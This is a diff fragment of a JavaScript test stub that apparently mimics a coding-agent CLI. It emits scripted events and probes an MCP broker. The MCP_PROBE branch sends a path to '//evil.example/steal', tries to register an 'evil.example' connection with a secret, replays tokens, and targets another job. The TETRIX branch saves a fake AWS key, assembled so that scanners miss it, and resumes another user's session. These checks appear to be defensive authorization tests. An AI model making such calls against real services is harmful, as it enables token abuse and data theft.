+    const tick = setInterval(() => emit({ type: "stream_event", session_id: session, event: { type: "content_block_delta", delta: { type: "text_delta", text: "working " } } }), 100);
+    setTimeout(() => (clearInterval(tick), result("Chatted.")), Number(prompt.match(/CHATTY: (\d+)/)[1]));
+  } else if (prompt.includes("LOOP")) {
+    for (let i = 1; i <= 6; i++) {
+      emit({ type: "assistant", session_id: session, message: { role: "assistant", content: [{ type: "tool_use", id: `l${i}`, name: "Bash", input: { command: "npm test" } }] } });
+      emit({ type: "user", session_id: session, message: { role: "user", content: [{ type: "tool_result", tool_use_id: `l${i}`, is_error: true, content: "npm ERR! missing fixture" }] } });
+    }
+    setInterval(() => {}, 1000);
+  } else if (prompt.match(/BACKGROUND: (\d+)/)) {
+    if (prompt.includes("EXIT ALWAYS")) {
+      mkdirSync(".obi", { recursive: true });
+      writeFileSync(".obi/exit-always", "");
+    }
+    background();
+    if (prompt.includes("EXIT")) return process.stdout.end(() => process.exit(0));
+    if (prompt.includes("FOREVER")) return;
+    setTimeout(() => {
+      emit({ type: "system", subtype: "task_notification", task_id: "bg1", tool_use_id: "b1", status: "completed", summary: 'Background command "npm run build" completed (exit code 0)', output_file: "", session_id: session });
+      emit({ type: "system", subtype: "background_tasks_changed", tasks: [], session_id: session });
+      if (prompt.includes("SILENT")) return setInterval(() => {}, 1000);
+      emit({ type: "system", subtype: "init", cwd: process.cwd(), session_id: session, tools: ["Bash"], mcp_servers: [], model: "fake", permissionMode: "default", apiKeySource: "none" });
+      result("Built.");
+    }, Number(prompt.match(/BACKGROUND: (\d+)/)[1]));
+  } else if (prompt.includes("MAXTURNS")) {
+    emit({ type: "result", subtype: "error_max_turns", is_error: true, num_turns: 200, session_id: session, total_cost_usd: 0 });
+  } else if (prompt.includes("TRANSIENT")) {
+    result('API Error: 529 {"type":"error","error":{"type":"overloaded_error","message":"Overloaded"}}', true);
+  } else if (prompt.includes("FAIL TOKEN")) {
+    result(`Authorization failed for token ${"gh"}p_${"Z".repeat(36)}`, true);
+  } else if (prompt.includes("FAIL")) {
+    result("it broke", true);
+  } else if (asks) {
+    queue.push(...JSON.parse(asks[1]));
+    said.length = 0;
+    listing = true;
+    askNext();
+  } else if (prompt.startsWith("obid paused you")) {
+    const retry = prompt.match(/got no reply:\n(\w+) (\{.*\})\nThe owner allowed it/);
+    if (!retry) return result(`heard: ${prompt}`);
+    asked = retry[1];
+    emit({ type: "control_request", request_id: "r1", request: { subtype: "can_use_tool", tool_name: retry[1], input: JSON.parse(retry[2]) } });
+  } else if (ask) {
+    const { tool, input } = JSON.parse(ask[1]);
+    asked = tool;
+    const send = () => emit({ type: "control_request", request_id: "r1", request: { subtype: "can_use_tool", tool_name: tool, input } });
+    if (prompt.includes("UNKNOWN REQUEST")) {
+      afterUnknown = send;
+      emit({ type: "control_request", request_id: "u1", request: { subtype: "elicit_something_new", detail: { anything: true } } });
+    } else {
+      send();
+    }
+  } else {
+    result("Nothing to do.");
+  }
+});
+
+async function report(prompt) {
+  const argv = process.argv.slice(2);
+  const at = argv.indexOf("--mcp-config");
+  const mcp = at >= 0 ? JSON.parse(readFileSync(argv[at + 1], "utf8")) : null;
+  const allowed = [];
+  const from = argv.indexOf("--allowedTools");
+  if (from >= 0) {
+    for (const arg of argv.slice(from + 1)) {
+      if (arg.startsWith("-")) break;
+      allowed.push(arg);
+    }
+  }
+  const answers = {};
+  const toolCalls = {};
+  const probes = {};
+  for (const [name, server] of Object.entries(mcp?.mcpServers ?? {})) {
+    if (server.type !== "http") continue;
+    try {
+      const response = await fetch(server.url, {
+        method: "POST",
+        headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list", params: {} }),
+      });
+      answers[name] = await response.json();
+      if (prompt.includes("MCP_CALL") && name === "oby") {
+        const first = answers[name]?.result?.tools?.find((tool) => tool.name.endsWith("_search"));
+        if (first) {
+          const called = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: first.name, arguments: { query: prompt } } }),
+          });
+          toolCalls[name] = await called.json();
+        }
+      }
+      if (prompt.includes("MCP_WRITE") && name === "oby") {
+        const acting = answers[name]?.result?.tools?.find((tool) => tool.name.endsWith("_send_message"));
+        if (acting) {
+          const refused = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: acting.name, arguments: {} } }),
+          });
+          toolCalls[`${name}_write`] = await refused.json();
+        }
+      }
+      if (prompt.includes("MCP_API") && name === "oby") {
+        const api = answers[name]?.result?.tools?.find((tool) => tool.name.endsWith("_get"));
+        if (api) {
+          const read = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: api.name, arguments: { path: "/v1/me" } } }),
+          });
+          toolCalls[`${name}_api`] = await read.json();
+        }
+      }
+      if (prompt.includes("TETRIX_CALL") && name === "tetrix") {
+        const call = async (id, tool, args) => {
+          const answer = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id, method: "tools/call", params: { name: tool, arguments: args } }),
+          });
+          return answer.json();
+        };
+        toolCalls.search = await call(21, "search_entities", { query: "where is the nothing" });
+        toolCalls.entity = await call(22, "get_entity", { id: "repo:acme/legacy" });
+        toolCalls.saved = await call(23, "save_session", { client: "claude-code", state: { did: "tetrix.txt" } });
+        toolCalls.resume = await call(24, "resume_session", { session_id: "someone-elses" });
+        // Put together here, so this file holds no key a scanner flags.
+        toolCalls.leak = await call(25, "save_session", { client: "claude-code", state: { key: "AKIA" + "QWERTYUIOPASDFGH" } });
+      }
+      if (prompt.includes("MCP_PROBE") && name === "oby") {
+        // More broker calls, then the broker token everywhere else on the runner.
+        const call = async (id, tool, args) => {
+          const answer = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id, method: "tools/call", params: { name: tool, arguments: args } }),
+          });
+          return answer.json();
+        };
+        toolCalls[`${name}_whoami`] = await call(5, "mail_whoami", {});
+        toolCalls[`${name}_draft`] = await call(6, "mail_send_draft", { to: "boss@example.com" });
+        toolCalls[`${name}_away`] = await call(7, "people_get", { path: "/away" });
+        toolCalls[`${name}_escape`] = await call(8, "people_get", { path: "//evil.example/steal" });
+        const base = server.url.slice(0, server.url.indexOf("/v1/agent/"));
+        const auth = server.headers?.Authorization ?? "";
+        const status = async (method, url, headers, body) =>
+          (await fetch(url, { method, headers: { "content-type": "application/json", ...headers }, body })).status;
+        const rpc = JSON.stringify({ jsonrpc: "2.0", id: 9, method: "tools/list", params: {} });
+        probes.jobs = await status("GET", `${base}/v1/jobs`, { Authorization: auth });
+        probes.connections = await status("GET", `${base}/v1/connections`, { Authorization: auth });
+        probes.connect = await status("POST", `${base}/v1/connections`, { Authorization: auth }, JSON.stringify({ name: "evil", api: "https://evil.example", secret: "mail-token" }));
+        probes.appleCheck = await status("POST", `${base}/v1/agent/apple-check`, { Authorization: auth }, "{}");
+        probes.noToken = await status("POST", server.url, {}, rpc);
+        probes.emptyToken = await status("POST", server.url, { Authorization: "Bearer " }, rpc);
+        probes.twoTokens = await status("POST", server.url, { Authorization: `${auth}, ${auth}` }, rpc);
+        probes.ownToken = await status("POST", server.url, { Authorization: auth }, rpc);
+        const other = prompt.match(/OTHER_JOB: (\S+)/);
+        if (other) probes.otherJob = await status("POST", `${base}/v1/agent/mcp/${other[1]}`, { Authorization: auth }, rpc);
+      }
+    } catch (e) {
+      answers[name] = { error: String(e) };
+    }
+  }
+  if (prompt.includes("TETRIX_CALL")) {
+    const session = JSON.parse(toolCalls.saved?.result?.content?.[0]?.text ?? "{}").session_id ?? "none";
+    writeFileSync("tetrix.txt", "made with Tetrix\n");
+    execFileSync("git", ["add", "tetrix.txt"]);
+    execFileSync("git", ["-c", "commit.gpgsign=false", "commit", "-q", "-m", `Add tetrix.txt\n\nTetrix-Session: ${session}`]);
+  }
+  const context = existsSync(".obi/context") ? readdirSync(".obi/context").sort() : [];
+  mkdirSync(".obi", { recursive: true });
+  writeFileSync(".obi/report.json", JSON.stringify({ argv, env: process.env, prompt, mcp, allowed, answers, toolCalls, probes, context }, null, 2));
+}
